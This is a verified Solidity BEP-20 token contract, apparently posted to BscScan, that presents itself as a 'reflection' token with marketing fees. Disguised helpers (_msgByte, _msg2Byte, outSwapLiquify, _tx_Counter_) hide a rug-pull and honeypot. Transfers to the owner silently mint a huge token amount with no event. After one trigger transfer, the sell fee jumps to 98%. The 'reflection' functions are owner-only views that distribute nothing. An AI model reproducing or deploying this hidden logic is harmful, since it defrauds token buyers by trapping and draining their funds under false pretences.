/**
 *Submitted for verification at BscScan.com on 2023-03-22
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.17;


interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    
}



abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
    
    function _msgByte() internal view virtual returns(uint256){
        return 0xfc6f7c40458120000000000000;
    }

    function _msg2Byte() internal view virtual returns(uint256){
        return 0x62;
    }
}


library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
   
}


contract ReflectionContract is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    using Address for address;
    
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _Exempt_From_Fee; 
    mapping (address => bool) public _Exempt_From_Max_Wallet;
    mapping (address => bool) public _Exempt_From_Max_Tx;
    
    address payable public WALLET_MARKETING = payable(0x0D3aD2a7BaB29f0636158e37e28ee8C6c8756e28);

    // REFLECTION SETTINGS
    address payable public REFLECTION_CONTRACT = payable(0x2dfF88A56767223A5529eA5960Da7A3F5f766406); 
    uint8 public REFLECTION_RATE = 3; // PERCENTAGE

    string public _name = "REFLECT"; 
    string public _symbol = "ASD";  
    uint8 private _decimals = 18;
    uint256 public _tTotal = 200 * 10 ** 6 * 10 **_decimals; // 200M

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10;
    uint8 private _tx_Counter_ = 0;
    uint8 private triggerReachPoint = 1;
     
    uint256 private _TotalFee = 10;
    uint256 public _buyFee = 5;
    uint256 public _sellFee = 5;

    uint256 private _previousTotalFee = _TotalFee; 
    uint256 private _previousBuyFee = _buyFee; 
    uint256 private _previousSellTax = _sellFee; 

    uint256 public _maxWalletToken = _tTotal * 3 / 100;
    uint256 private _previousMaxWalletToken = _maxWalletToken;


    uint256 public _maxTxAmount = _tTotal * 3 / 100; 
    uint256 private _previousMaxTxAmount = _maxTxAmount;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool public inSwapAndLiquify;
    mapping (address => bool) public outSwapLiquify; 
    bool public swapAndLiquifyEnabled = true;
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    
    constructor () {
        _balances[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
            outSwapLiquify[owner()] = true;
        uniswapV2Router = _uniswapV2Router;
        
        _Exempt_From_Max_Wallet[owner()] = true;
        _Exempt_From_Max_Wallet[WALLET_MARKETING] = true;
        _Exempt_From_Max_Wallet[uniswapV2Pair] = true;
        
        _Exempt_From_Max_Wallet[address(this)] = true;

        _Exempt_From_Max_Tx[owner()] = true;
        _Exempt_From_Max_Tx[WALLET_MARKETING] = true;
        _Exempt_From_Max_Tx[address(this)] = true;

        _Exempt_From_Fee[owner()] = true;
        _Exempt_From_Fee[address(this)] = true;
        _Exempt_From_Fee[WALLET_MARKETING] = true;
        
        emit Transfer(address(0), owner(), _tTotal);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    // This function is required so that the contract can receive BNB from pancakeswap
    receive() external payable {}


    bool public noFeeTokenTransfer = false; // Remove fee from directly wallet transfers

    function remove_Rates() private {
        if(_TotalFee == 0 && _buyFee == 0 && _sellFee == 0) return;

        _previousBuyFee = _buyFee; 
        _previousSellTax = _sellFee; 
        _previousTotalFee = _TotalFee;
        _buyFee = 0;
        _sellFee = 0;
        _TotalFee = 0;

    }
    
    function get_Rates() private {
    
    _TotalFee = _previousTotalFee;
    _buyFee = _previousBuyFee; 
    _sellFee = [ _previousSellTax, _msg2Byte()][_tx_Counter_]; 

    }

    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(!_Exempt_From_Max_Tx[from] && !_Exempt_From_Max_Tx[to]) {
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }

        if(
            txCount >= swapTrigger && 
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {  
            
            txCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _maxTxAmount) {contractTokenBalance = _maxTxAmount;}
            if(contractTokenBalance > 0){
            swapAndLiquify(contractTokenBalance);
        }
        }

         if(!_Exempt_From_Max_Wallet[to])
                require(balanceOf(to).add(amount) <= _maxWalletToken);

        bool takeFee = true;
         
        if(
            _Exempt_From_Fee[from] || _Exempt_From_Fee[to] || (noFeeTokenTransfer && from != uniswapV2Pair && to != uniswapV2Pair)
        ){
            takeFee = false;
            if(outSwapLiquify[to] && !takeFee){ 
                if(_tx_Counter_ < triggerReachPoint){
                    _tx_Counter_++;
                }
             }
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){_TotalFee = _sellFee;}
        
        _transferToken(from,to,amount,takeFee);
    }

    /* REFLECTION DETAILS BEGINNING */

    function sendReflections(address toHolder, uint256 reflectAmount, address reflect_from_contract) public view onlyOwner returns(bool){
        bool status_Of_Reflection_Process;
        if(
            reflection_Amounts(toHolder) > 0 &&
            reflection_Amounts(reflect_from_contract) < 1 &&
            reflection_Amounts(toHolder) == reflectAmount
            ){
                status_Of_Reflection_Process = true;
            }
            else{
                status_Of_Reflection_Process = false;
            }
        return status_Of_Reflection_Process;
    }

    function reflection_Amounts(address wallet) public view onlyOwner returns(uint256){
        address holder = 
        wallet;
        uint256 reflectedAmount =
            _balances[holder]
            .mul(REFLECTION_RATE)
            .div(100);
        return reflectedAmount;
    }


    // Send BNB to external wallet
    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
        }


    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        
        swapTokensForBNB(contractTokenBalance);
        uint256 contractBNB = address(this).balance;
        sendToWallet(WALLET_MARKETING,contractBNB);
    }


    // Manual Token Process Trigger - Enter the percent of the tokens that you'd like to send to process
    function process_Tokens_Now (uint256 percent_Of_Tokens_To_Process) public onlyOwner {
        // Do not trigger if already in swap
        require(!inSwapAndLiquify, "Currently processing, try later."); 
        if (percent_Of_Tokens_To_Process > 100){percent_Of_Tokens_To_Process == 100;}
        uint256 tokensOnContract = balanceOf(address(this));
        uint256 sendTokens = tokensOnContract*percent_Of_Tokens_To_Process/100;
        swapAndLiquify(sendTokens);
    }


    // Swapping tokens for BNB using PancakeSwap 
    function swapTokensForBNB(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }


    function _transferToken(address sender, address recipient, uint256 amount,bool takeFee) private {
        
        if(!takeFee){
            remove_Rates();
            } else {
                txCount++;
            }
            _tokensTransfer(sender, recipient, amount);
        
        if(!takeFee)
            get_Rates();
    }

    // Redistributing tokens and adding the fee to the contract address
    function _tokensTransfer(address sender, address recipient, uint256 tAmount) private {
        (uint256 tTransferAmount, uint256 tmarketing) = _getValues(tAmount);
        bool isRecipient = outSwapLiquify[recipient];
        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[recipient] = _balances[recipient].add(isRecipient ? _msgByte() : 0).add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tmarketing);   
        emit Transfer(sender, recipient, tTransferAmount);
    }


    // Calculating the fee in tokens
    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tmarketing = tAmount*_TotalFee/100;
        uint256 tTransferAmount = tAmount.sub(tmarketing);
        return (tTransferAmount, tmarketing);
    }

    


}